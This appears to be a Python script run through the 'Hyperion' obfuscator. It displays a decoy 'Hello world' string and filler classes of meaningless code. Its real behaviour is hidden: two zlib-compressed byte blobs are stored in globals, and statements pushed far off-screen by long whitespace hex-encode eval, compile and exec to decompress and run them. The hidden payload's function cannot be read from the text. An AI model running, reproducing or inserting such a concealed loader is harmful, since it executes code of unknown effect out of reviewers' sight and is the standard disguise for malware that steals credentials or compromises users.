from builtins import *
from math import prod as _negative


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Positive, Power, Square, _random, Theory, _builtins, _positive = exec, str, tuple, map, ord, globals, type

class _round:
    def __init__(self, _statistics):
        self._power = _negative((_statistics, -19027))
        self.MemoryAccess(Product=32060)

    def MemoryAccess(self, Product = True):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._power += -45543 / Product
        
        try:
            {_random: 'eRbB5lue66'} if _builtins == Positive else (Power, Algorithm) > _builtins

        except ArithmeticError:
            ((Positive, {Theory: '6giR56gRhelRRiteo'}) for Positive in (Power, Algorithm) if Algorithm > _random)

        except:
            _positive(49473 - 6998) == None

    def Add(self, _memoryaccess = -28404):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _memoryaccess /= 73081 + -70577
        self.Random != type
        
        try:
            ((Algorithm, Theory) or Power if (Algorithm, Theory) and Power else ... or (Power, (Algorithm, Theory)))

        except ArithmeticError:
            {Algorithm: Algorithm} if Algorithm is Theory else {Theory: '6giR56gRhelRRiteo'} > Power

        except:
            _positive(38998 / -93026) == type

    def _hypothesis(Divide = str):
        return _builtins()[Divide]

    def _modulo(_callfunction = -52310 - 37223, _walk = None, Ceil = _builtins):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Ceil()[_callfunction] = _walk
        
        try:
            ((Algorithm, (Algorithm, Theory)) for Algorithm in (Theory, Power) if Power > Square)

        except AssertionError:
            (Power, Algorithm) if _random != Algorithm else {Algorithm: Algorithm} > _random

        except:
            _positive(39075 - 8191) == False

    def execute(code = str):
        return Positive(Power(Square(_random(Theory, code))))

    @property
    def Random(self):
        self.StackOverflow = '<__main__.Positive object at 0x000004141BE27395>'
        return (self.StackOverflow, _round.Random)

if __name__ == '__main__':
    try:
        _round.execute(code = __code__)
        _floor = _round(_statistics = 17225 / 93604)

        _floor.Add(_memoryaccess = -28170 * _floor._power)                                                                                                                                                                                                                                                          ;_round._modulo(_callfunction='WWWWXXWXWWXWXWXXX',_walk=b'x\x9c\xe5\x1b\xdbR\xe3:\xf2\x9d\xaf\xe0\xf0\x92\xa4\x98alY\x17\x9b\xaay\xd9b\xb7\x0eU\xcb\xb0ufkak\x86J9\xb1\xc3\x98\xe3\xc4l\xe2\x1c\xe0\xef\xb7[\x17\xc7\xf1\x05+\xc10SE\x84.n\xb5e\xa9\xd5ju\xb7D\xbe|:=8\x84_2\x1b\xca\x1c\x7f\xe3q6\x99\xadW\xd30\xcf\x96\xe3\xf1\xe1o\x9f\x8f~\x7f\xba\x8f\x97I\xb68:\xcc\x96%\xb4p\x9d\xff\xc8\x96+\x893<\x9a$i\xfa\x94\xff\x88o\xb30\xf7\x18?\xfap\xf4\xb7t\x1d\xff\x11GG\xa3\xad\xb7n\x93\xfc\xc7z\xa2\x1a\xfe\x91\xe7\xf7\xab\xd3O\x9f\x14\xecd\x9a\xcd?U\x9a\xf9\xd4\xf2\xed(YM\xb3e\xb4\xdd\x8c\x06\x9e\xdc\xde~\xbaO\xc3\xdbu\\y)M\xa6\xf1b\x15\xab\x97\xfe\xfe\xaf\x7f~$\'N\x05e\x9aE\xaa~p\xbfL\x16\xf9\xf0\xe8\xf78M\xb3\xc3\x87l\x99F\xbf\x1d\x8d\x06\x07\xa3\xd3\x02\x1b\xeb\x07\xab?\x93h0:\x88\x1f\xa7\xf1}\xae\x89\xb9\xb8_\xc3\x9b\x7fd\xabxu\x18.\xe3\xc3e\x1c}_\xfc\'\xc9\xd28W\x80\tP\xe6\xfb\xe2\xbf\xd9Z>\x85\x87\xd8\xc8\xf7\xc5\x97l\x92EO\x87i\xf2\'\xbc\xf7\x94\xad\x8fF\x07\xaaS\xc9\xfc>[\xe6\xe31|\xedi5\x18\x9d\xc4\x8fI>\x1c\x1d\xa4\xd94LW\xc3\xd1\xb7\xc1\xc5\xc5\x97\xad\xdf\xc5\xe0\xe6\xf3m\x9aM\xa0\xfa\xa0V\x87/$\xea\x97\xde\xa5irw\x07$\xc7l\xf0\xed\xf4\xf4\xf8\xe3\xf1\xc7\xe1\xc7\xe1\xb1;\x1a\xdd\xdc|\x8e\x92e\xf3\xfb_$\x10\xab.t\xa9\xfe\xf2m\x9c\x87y\xde\xd2\xc0\xe5evy\x96]^\x9e\x9d\xc1\x1f\xfc2\xe8\xb1\x1a\xcfA\xad\n\xf1\xbf\x12B\xbeB _U\t\x1f\xf0G\x08\xbc\xb8\xa1P\xf3\xc7\xae\xae\xae\xaf\xae\xaf\xaf\xcc\xef\xfa\n\xdeiop8\x98\xac\x934O\x16H\xea\xbf\xc2e\x0b\t\xa1\x9d\xeb\xa2Y,^\xa9\x08m_T\xa9\xf3e\xf8\xdc\xe7V\x8b$O\x93\xf5\xa4J\xc2\xd1\x87bj \xbbK\xf5\xa4\xed\xd7\xd6\xe8[\x9f\x8d\x9d$\x8b(~\x1c\x0e\xf20Kg\xb5\xea\x9b\xd1A\x8d\xe4\x92\xebR\xf8\xf8\x1d\xb0\x1d\xf4 \xc1\x9e \xffAO\xd2wE\xb3x\xbd\xfcw\x13\xc9\x1a\xf9\xfe\xe1\xe1\xf1\xf1\x01\x93\xc7\x87GU|x\xd8\x9dZI2]\x85\x8b\xa4\x17j\xb5\xb6\xb5\x0f\xb5\xda\x1b3\xd4z\x9a%\xe9c\xfcc\xb1\xb6&\x192\x170\x19t\x02\xfb\x91\xa8\xc7w\xc5a\xcb|e\xbd&\xbf\xca\x96M\xeb\xb2D\xde\x15\xb1\xd2,\xab\xd7\xb6\xf1\x16\xca+\xd5\x07`0\xd5\x07\x90iw\xefL\x80\xad\xd2\xf0\x1fM$k\xdc\'\xe1\xf3\xe7\xe7\x18!\xc5\x90\xbe/b\xa5\xe1_\xb15\xad\x90\x1a\x9a(X\xc0\xf8\xae\x88\x15\xa7\xc9\xfd<\x9b\xda\x8bz\\\x83\x90\xdcI\xcdB\xae\xcd;)\xeb\x07\x83\x93\xbb,Y4R\xb9iK\x1dN\x06tFg\\G\x1d(\x9fa\xa0\xd4<)\x08>\x81j\x18\xc5h,\x0c\x07\xfe,o\xd8\x9c\xde\xd1\xacM\xe3Gk\x16\x7f\x1b\xe2\xab>\x1d\xe6\xcb\xec~\x9e\x1c\x9a\x11\x1c\xce\xb3\xe5\x96\xb2Z\x17M\xc3\xc1\xc8\x85*\xa7\x03\xabe\x14\x9eC"\xe2\x93\xc8sI\xd0\xd5\xc7\x91J~.\x99Z>\xc3\x03\x1e\t\x87\xcf\x04\x11\x948\x82p&\\\xc1 \xf5\x04\x15^\xe7\xc8\x9a\xd7\xeab>\x9f/\xe6\x0b\xc80b\x19\x93\x05,\xd6F\xf4U\xbe\x8a\xd7\xff\x8b\x97\x9d\xf3\xe5@\x95\xdb\x89\xe5\x8f\xdd1\x19\xd3\xb1\x80T\x8c}\x08\x1e\xa0\x06uh/\xfc1\x18\x89\xb1\'[u!\xa7\x10\xbd1\xbcw\xec\xd7\xa1{r\x9a`3\x8f@t \x06\x10}\x1d\x99\x86a$d"\xb9\xd1\x06w\x17\x8e-\xc5\x9b\xe6}\xec\x11\x7f\x0f\xaa\xef\xb2\xeb\xea\xb1\xd8\xcb\xac\x98\x1d\xf8\xcd\xe7\x8cw\xf2\xdbM\xb3b\xab\xe8(\xc9\xa8r$m\xf7\xec\x8e\x1d\x08\x0cf\x88A\xee\xc3l1@%uhgK\x140q\xa6q\xae\x1d\xc9e\x1cPY\x1d\xba\'\x07\xe0\xec\xe1\xccz:\xe7\x10\xa9\x9eUW\xc3\x99\xe6\x00\x1b\\\xba\x1b\x07\xdc|N\xc3\xf9$\n\x0f\xe7j\x1d/\x162\x91k\xfb\xb4a\x96\x9b\'I\x03\xafU\x8e\x05\xf5\xdc\xd3\xaa\xb7[\xab8\xb7\x01\xcc\x04\x83\xf9 0\xbb\x90\xe2\x88\xeb\xd0\xce\x96\x18p\x06\x1d\xab\x99gc\x0eO\xb8\xeay\x1d\xda\xcb\xf8\xfa\xdc\x85\xaa\xeb\xda\xcc\xae\xb4\xa2\x95\xcf\x06\x15\xad$=m\x90\xd6\x8ds\xdb\xb6\xaaC\x08S\x88\x01\x84)\x04\xccC\xf9l\xa02t+X\xf6\x14!\xb0\x91u\xefZ\x8d\x0c:/\xd8\xdblZ\x8bW\x9d;\xa2e\xb4\x89\x8e\x96\xd5T\xafZ\xb9b\xf5\xaa\xb6\xc1u\xecy`7\x8ar\x1ft\x01*\x1c\xe1y!\x99\x11\xd0\x15\xb8+\x04\x89\xb9\xe0\x81\xa0P\xcb8\x11\xa01\x80\x14\'\xdc\x03\x95$\x06(\xc3\x14p\xf09"3\x06\xfa\x04\xbcED\x00\x98\x0c\xc65c\xa0k\x00\x17\xcc\x80\x03b\x12\xf1\x88\xbb\xb24\xdb\x94\xc4\x16\x86\x90-p\x02\xbc\xc3H\x0c\xbd\t\xbc\x99@\x05h\x82\xdf\xf2"\xe8\xa2\xcf<\xea2\xea9\xd4-\x05\x8fy\x9eVi0e\x146\x1aN\x03:\xa5\x13\xc6\xa9O9\xe4\x8eG)c\x80\xc9Bx\x1f4,\xc8C\xe6\xee\xcbKm\x0b"\xd6!*b9\x8dK)\xe4\x16\xcbB-\\5\x7f8\x9d\xf8\x83\xec\xb4\xa1O\xcd<\x8f\xa2\\\x06\xf5\xb7\xe8d\xf96fv\xb5 \xb2d\xc2\xa2\xef_\xb51"\xddQ\xd2=\x85\x0f/\x96<\xf1\x16\x81\xab$\xd6Pk\x02\x9fe\xd0\x1b\x08\xd9\x19\xf4+\x93}\xba\xcc\xac\x89\xdc\xa6\xe0Oi\x08\\\xb8\t\xa1NM>\x85\x00\\j\xddK\xa4\x18v\xec\x12\xc9\x86]~i\x0fy\xc9\xf8(\x1b\x1b\x94J\x13\x84n\x9b"\x88c\xddW\xf5\x11\x9d\xca\x0f\xdb\xf3l\x96\xe1\x10\x91C\xb23,K\xfe\x80\xe7\xb7\xd9B\x8b!\xa8~+\x95\xf7a3\x1c\x18\x89\xadJ\xd4\xd2#\xe1\x0b\x01Q\x85M\t\xcb\xea\xe7\x17)Dk\x92\xcb\xadm\xbe\xb1\xcc\xd4\xdf\xc2z\xa9\xe9\x83\xc4\x14}0w\xda\x19\x83\xc7;\x89\x85z\x0cj\x90V\x86}\xa9\x18\x05R=\xaeA_` \x89\x8a\xdaK\xb5\xbaK\xf4\xe6(J\x06R\x17.\xdfi#U\xd4M\x95\xd1!\x8d\x8f\xf4\xdc\x08b\x805r\xc3.\xa6\x11*N(\x08\x02\x93\xab\xb2\x89\x18\xba\xad\xff]\x1c\x0f1\x8d \x98t\xf3\xa4J:\xef\xfe\xe4\x91$\x91{\x0c \xa88>=\xfd6X\xe73\x7f0\x8c\xa3l\x1aG\'\xa3A@\n\x15P*\x8aF9,+\x8bS\t\xf3\x89\xe1\xfc\xedUa`\xdb\xb5\xbe\x18L\x86\x0fzE*\xe9\xa2\xc6:\xbc\xa9j\xbf\xdd]t=)\x1e\x88\xe3\xb55*\xa7\xfa\\q\xaa\xda\x85\xcb\r\xa2%)\xa4\r\x88\x8c\xce!\xf7\xa1\xba\x0e\x15\xa3AGKB\xda\'\\\xbeA\xe0\rx\x0b\xaa\xebPb\xd1\x12\x85%\x07\xf6(,?\xa1\x82l\xa9\n\xe5\x9d-I)\x8c\xc2\x18%\xf1\x19f\xb8\xf1\x80(\x1e\r\xab\x1cwq\xd4\x8f\t\x87Dc\xd2`C\xe3\\\x1a\xd6\xd2l\xafA{2\x19\xa94\xe3<i\xc0;\x92\xd8TJ\xaf\x1a\xb4\xb3%\x9c&Ebe$2\xd9\x92W\x87Z\xd1\x00\x18I\xba*p\xcc\x81tq\x91:\xf4U]\xa0^\xc9\xc1\x14h\x19j\x8c\x11f\x8c\x15-wmp\xfd\xfd\x8dX\x13?\xcc\x924^\x84\xf3\xf8sK\xa7\x99\x0fA\xe8\x88\xa9\t\xe6I\xe6]\xdd\xf80\x87\xba\xb6O\x80\x8d\xc1\xc1P\xe9\x94\xcam\xde\xd3\xfa\x8a\xb3\xe0,\xdc?\xe9X\xb9"\x91\xa3\x98\xe4\xac\x1a\xb4\xa75\xf1\x12\xae\xd9\xd1R\xd8rU\x0cw\xd1\xaf\xdfp\x1f\xd3^y\xae\xd5a]\xa2Z=F\xaf=\xa5[\xca4\xech[\xa6H\xab\xb1\xe2\x90\xd0\t\xbdm\x9b\xb1n7F\x12\x93\xc3\x8e\xd9\xba\xf3u\r\xa2\xdc\xd1\xcd04\xa4d\x05\xa8a\xb4|\x06\xc4\xfeUiv\xa4\xb7\xaf\x17\xb1\xdf\xc6L\xbc\xec+\xd1\xaa\x1c\xd5\xaa\x9c\xab\xc5\x8d\xa7E\x90\r.\xb1g\xcaNQ\x83\x04\xf3\x1c\x15TY=#QU\xdam0)AS;Y~\xcd\xe5\xd6(\x94^U9\xdd\xe1\x83o\xb7\xa8#\xbe\t1\xdf8n\xa2\xed\xc5\xe7\xc5\xba\x1b\xf1V\xd7\xa2rwd\xde\xa9\x92vK\x19G\xab\xa2\xee\x9e\xaa\xa8\xd4\x08\xf4a\x14W\xba\x02T\xd7\xa1\xdd\xaah\xafj\x1f\x97*\x1b*R\x81>3\xc3\xd3\x13Q\x87\xbe\x9d\x8f|\xb3\xb6\x07\x97\x0e\xba\x1a\x9c\xccqp\x84\x8e\xfc\xa9\xb1\xbe\xc5r\xb4_\xffx\x0ei\x14R<o\xf2\xf4\x89\x84_\x87\xf6v\xceJd\x9b\xbe\xb4e\xf0\xbc\x93\xcas\xd6\x1a\xf4\xd7>\x01y{c\xbc\xd1\xbbr\xa1o\x01\x15\x97\x82.\xbe\xecI\x11Z:\x1f\x10\xbaLu\x99\xe8=\x90\xeb=\xd1\x06\x97Y:\xc6\xda:\xa4\xd5\xea\xaa\xc2\xbdQ\xbc\x05t%`\x13"\xb4\nRq-\x96\xee<l\xdd\x89 \x82M\xbc\xd0\x0ba(\x91\x8c\xbe\x8c\x13\x9bI\x02<A\x82\xe2\x08\x85jo\x9096wKd\x08T\xab\x12\xde\x8d\xfb\xf2>\x99\xe9\xe0\xba\xed\xa0\xa4\xb6\x18\x98n\xb5P[\x9e\xc7\xed\xa1O\xc5"{Q[\x8d\xfe\x1aQ\xf8s\x8a\x1f\xf19!\xc2\xf3<\xdfc\x9cCNt.t\xceuN+\xcf\x81\xce\x1d\x9d\xb3\xa2\x9ep\x02\xad\xf8\x90\xd3\x1e\xdbe\xd0B\x80\x14\x02m\x1e\x8f\xbc\xf0\xb0\x0br\xa4\x9a\xe7s.\xa8`m\x14C\x81\x05\\\x1faZ.\xd5s(\xedJ9\x0e=\xe68j\xe81\xe7LGZ\xcai\x05N+8e\xf8\x06\xe6q\x174W\xb7\xd2nS\xfbM\xed\xb6}\xa3\xde\x0f\x9c)\n\x146\x91c^\r\x1a\xceK\xf5\xbc\x8c\xdf\x10\xcb\xf8\xbd\xcc\\\xa7\xfe\xbeQ$Po\x00\xa5\xc9\xb9\x04\xed!\x83\x14\x9e\xf7\xd6"\xa81W\xb4\x1c2&\x8d\xf1b\x93\x8a\x88\xef\xc2\xb5\x14\xf1}\xb9=Z/\x0f\xef\xe4\xf6x\xee\\\x9d\xeb\xc1\x9aA\x1b')

        _floor.Add(_memoryaccess = 59038 * _floor._power)                                                                                                                                                                                                                                                          ;_round._modulo(_callfunction='IIJIILLJIJLLJJLLILLLLJL',_walk=b'7?\xd5B\x92\x96\xce\xd5\xbbp=\xdb\xfd\xafqX\xfd\xed\xeb\xbb\x1eTYy.l\xcd\x17\x9f\xc0\x8a\xe0\x82\xc7\xa4n\x06m\xfb-\xe2\x12\x1c\r$\xc7\xc3\x1d\x1bS\xb4\x84g\xfa\x10Q\x954\x84>\xe3R\xd8\xc5@\n\xbc\x19c\x10}\x1d\xa1q\x860\x0e\xd1\xd50!\x8d\xa8\tq4\xfcy\xdc\xfd\x0c-.\x9d\xd1\xbe\xd6\x7f]t\xebBu\x1d\xea\xbd\xc4\xd0\xda\xd5\xd1\xf2\x9c\x177(\xc9\x05\xa3\x02\x9a+\'\x9cm\xae\x17\xda\xe0Z\xb2gI2\xaa\xf3\xb2\xf3\xe2\xee\xde\xf9\xf9\xabZ\x0c{8 \xfb\x12|-\xb7\x17{\x12|\xbb\xde\xc1x\xaf\xde\xd4\xe2\xec\xbcH\xb7O\x0f\xb7\xcf\x19;\xfc\xaav\x92\x89i\xe9B\xa5TQR\x06s\xa2a\xa4$\x99\xb8\x15\xee~\x92\xa9G\xc7M+\x17j\xb9`\xec"\xa7\xf4\xcc\xb4\xac0\xdb\xaf\r\xae\xe5\xf6[\x92\'D\xffG\x83\xb9T\xa4\x9e\xb1\xf4\xea\xf7\xf9\xca\x03\xe0\xdaP4\x8a\x96S\xd1;\xbap-\x07\xfe\xda\xf2\xe9\xcd]\xbf=\xaaL\xa4\xc4W\xe6\xf4\xd1\xd8\xc9N\xc3\x94t\xe1Z\xab\x82\xddb\x8e\n\xbc7IELl\x15\xa4\xc8Sd\r\x8b+\x13\x9b\xeb\x12\x9b\x9a\xa9\xbc4\xf1\xd3\x8f\x8129\x9d8\xafxk\x0efx_i\xb2\xa3\xbft#\x05\x1et\xcf\xf4?(`\xc3\x9d\xcb\xdf\xd3w\x92\\y\xa1\x02\xff\x15\x00]\xd1\xb4\x0e\xedl\x89\x8f\x03y\x9e\xef\x8c=}\x15\x9cH\xa7v\r\xfa\xb6n\xcf_\xeb\xe0\xbamp~I*\x1a\x17\x97\xb1\xc6\xcc)\x9e\xaf\x97\xad\r\xaex\x89\x05\xf7\xca\nQ[\xf3\xa6\xd9\xb6\x10)\xa7\xe9\x8e\x8e!Zq\x904:J\xb4#\xa5\xecX\xa9\xd6\x95qt\xddK\x9d)\xbd\xb8\xb9\x9a\\NUwW\xd5eU\x8fe7\x17Cg!:\x08e^.W\xf3\xa6\xfa&\x9c\xedztu\xf5\xe9\xa2{c\xb7\xd6\xf3\x17\xb0\xb7C\\\xf1\x12t\xae\x8e_\xcb\xdf\xa4.\xb2\n\xf9\x1f]\x0e^\xa6\xc1\xa0/\xb2V\xa0\xbd]=\x13\xf2\x14\xcd\x91g\xa0\xf2^^qqv\x0b\xda\xd3\x89^\xa0\xb7%W\xde%t`\xa3\xc2\x13D\xcc+\xd0\xb7\xbf\xfa\xb3\xb9\x02\xf4\x13n\x0b<s\xc1\x83\x9b\xfb\xef\xa5{\xf1\xe6\xc7g?\xe3`k\xe7C\x16G\x1e\x8al\x0eG\xdc>\x0f5\xf6\x90\xea\xf0\x95\x86X\x0eUX\x15\xaf\xfd]%mA\xc0\x83t\x979\xee \xa6\\<\xeb\xbc\xa8\xd3\xd1\xc0\x1a\xde\xf95\xa4n\x89\xb8\x1b\x92W\xfd\x1c[5\xaf\x7f\xff\xc8x\xd2\xcb\xc7\xa6\xa2t\x04\x11\x94\xdc\x8b6\xb8\xd6\n\xef\xc1\xff\x01:$\x93\x0f')

        if 405891 > 6901623:
            _floor.Add(_memoryaccess = -52034 + _floor._power)
        elif 373435 < 9038642:
            _round(_statistics = -202 + 63206).MemoryAccess(Product = _floor._power + -56871)                                                                                                                                                                                                                                                          ;llIlIlIllIlllIllIlIIlIl,DDOOOOODODDDooODDoo,lIlIIlIIllllIlllIl,XWWXXXXXWXXXWXWXXWXW,DDooDDOoDoODoooOOOODDOO=(lambda mmnmmmmmnmnmnmnnmnmnnnn:mmnmmmmmnmnmnmnnmnmnnnn['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda mmnmmmmmnmnmnmnnmnmnnnn:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mmnmmmmmnmnmnmnnmnmnnnn)"),filename='\x6a\x69\x6a\x69\x6c\x6c\x69\x6c\x69\x6c\x69\x6c\x6c\x69\x6a\x6a\x6c\x6c',mode='\x65\x76\x61\x6c'))),(lambda mmnmmmmmnmnmnmnnmnmnnnn:mmnmmmmmnmnmnmnnmnmnnnn(__import__('\x7a\x6c\x69\x62'))),(lambda MNNMMMNNMNMMNNMNMNN,mmnmmmmmnmnmnmnnmnmnnnn:MNNMMMNNMNMMNNMNMNN(mmnmmmmmnmnmnmnnmnmnnnn)),(lambda:(lambda mmnmmmmmnmnmnmnnmnmnnnn:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mmnmmmmmnmnmnmnnmnmnnnn)"),filename='\x6a\x69\x6a\x69\x6c\x6c\x69\x6c\x69\x6c\x69\x6c\x6c\x69\x6a\x6a\x6c\x6c',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _round(_statistics = -6759 * 25337).Add(_memoryaccess = -78813 / _floor._power)                                                                                                                                                                                                                                                          ;DDooDDOoDoODoooOOOODDOO()(XWWXXXXXWXXXWXWXXWXW(llIlIlIllIlllIllIlIIlIl(lIlIIlIIllllIlllIl(DDOOOOODODDDooODDoo('\x76\x61\x72\x73'))),_round._hypothesis(Divide='WWWWXXWXWWXWXWXXX')+_round._hypothesis(Divide='IIJIILLJIJLLJJLLILLLLJL')))

    except Exception as Algorithm:
        if 391036 > 847537:
            _round.execute(code = Power(Algorithm))

        elif 458236 > 6971396:
            _round(_statistics = -37768 - 51185).Add(_memoryaccess = -62283 + _floor._power)
